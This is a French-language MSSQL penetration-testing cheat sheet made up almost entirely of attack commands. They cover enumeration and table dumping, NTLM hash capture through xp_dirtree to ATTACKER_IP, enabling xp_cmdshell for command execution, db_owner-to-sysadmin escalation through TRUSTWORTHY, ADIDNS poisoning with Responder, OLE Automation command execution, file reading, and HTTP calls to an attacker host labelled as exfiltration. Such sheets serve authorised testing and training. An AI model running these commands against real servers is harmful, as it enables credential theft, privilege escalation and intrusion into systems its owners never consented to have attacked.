# MSSQL Enumeration

```sql
# ============================================
# FICHE D'ÉNUMÉRATION MSSQL - PENTEST
# ============================================

# --- CONNEXION ---
impacket-mssqlclient -port PORT DOMAIN/USER@IP -windows-auth
impacket-mssqlclient -port PORT USER@IP  # Sans domain

# --- ÉNUMÉRATION BASIQUE ---
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');

# --- LISTER LES BASES DE DONNÉES ---
SELECT name FROM sys.databases;
USE nom_database;

# --- LISTER LES TABLES ---
Sp_tables;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
SELECT name FROM sys.tables WHERE is_ms_shipped = 0;

# --- DUMP UNE TABLE ---
SELECT * FROM nom_table;

# --- PERMISSIONS UTILISATEUR ---
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
SELECT USER_NAME(), IS_MEMBER('db_owner');

# --- LINKED SERVERS (IMPORTANT!) ---
SELECT * FROM sys.servers;
SELECT * FROM sys.linked_logins;
EXEC sp_helpserver;
SELECT * FROM OPENQUERY([SERVER_NAME], 'SELECT @@version');
EXEC ('SELECT SYSTEM_USER') AT [SERVER_NAME];

# --- SQL AGENT JOBS (CREDENTIALS POSSIBLES) ---
USE msdb;
SELECT job_id, name, enabled, description FROM dbo.sysjobs;
SELECT j.name, s.step_name, s.command FROM dbo.sysjobs j INNER JOIN dbo.sysjobsteps s ON j.job_id = s.job_id;

# --- PROCÉDURES STOCKÉES CUSTOM ---
SELECT name, type_desc FROM sys.objects WHERE type IN ('P','PC','FN') AND is_ms_shipped = 0;
SELECT OBJECT_NAME(object_id), definition FROM sys.sql_modules WHERE is_ms_shipped = 0;

# --- TRIGGERS ---
SELECT name, type_desc FROM sys.triggers WHERE is_ms_shipped = 0;

# --- LOGINS ET USERS ---
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U');
SELECT name, type_desc FROM sys.database_principals WHERE type NOT IN ('R','A');

# --- IMPERSONATION ---
SELECT pr.name, pe.permission_name FROM sys.server_permissions pe INNER JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id WHERE pe.permission_name = 'IMPERSONATE';

# --- TRUSTWORTHY (ESCALADE DE PRIVILÈGES) ---
SELECT name, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;

# --- CONFIGURATIONS SERVEUR ---
SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled');

# --- ÉNUMÉRATION FILESYSTEM ---
EXEC xp_dirtree 'C:\', 1, 1;
EXEC xp_dirtree 'C:\Users', 3, 1;

# --- CAPTURE HASH NTLM ---
EXEC xp_dirtree '\\ATTACKER_IP\share';

# --- RCE SI SYSADMIN ---
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# --- ESCALADE DB_OWNER → SYSADMIN (SI TRUSTWORTHY=1) ---
USE database_name;
CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'USER', 'sysadmin';
EXEC sp_elevate;
SELECT IS_SRVROLEMEMBER('sysadmin');

# --- ADIDNS POISONING (AVEC CREDENTIALS DOMAIN) ---
# Sur Kali:
bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC_IP add dnsRecord HOSTNAME ATTACKER_IP
dnstool.py -u 'DOMAIN\USER' -p 'PASS' --record 'HOSTNAME' --action add --data ATTACKER_IP DC_IP

# Lance Responder
sudo responder -I tun0 -v

# Force connexion depuis SQL
SELECT * FROM OPENQUERY([HOSTNAME], 'SELECT 1');
EXEC ('SELECT 1') AT [HOSTNAME];

# --- OLE AUTOMATION (RCE ALTERNATIF) ---
DECLARE @obj INT;
EXEC sp_OACreate 'WScript.Shell', @obj OUT;
EXEC sp_OAMethod @obj, 'Run', NULL, 'cmd /c whoami';

# --- LECTURE FICHIERS ---
SELECT * FROM OPENROWSET(BULK 'C:\path\file.txt', SINGLE_CLOB) AS x;

# --- EXFILTRATION HTTP ---
DECLARE @obj INT, @response VARCHAR(8000);
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT;
EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://ATTACKER_IP:8000/', FALSE;
EXEC sp_OAMethod @obj, 'send';
```
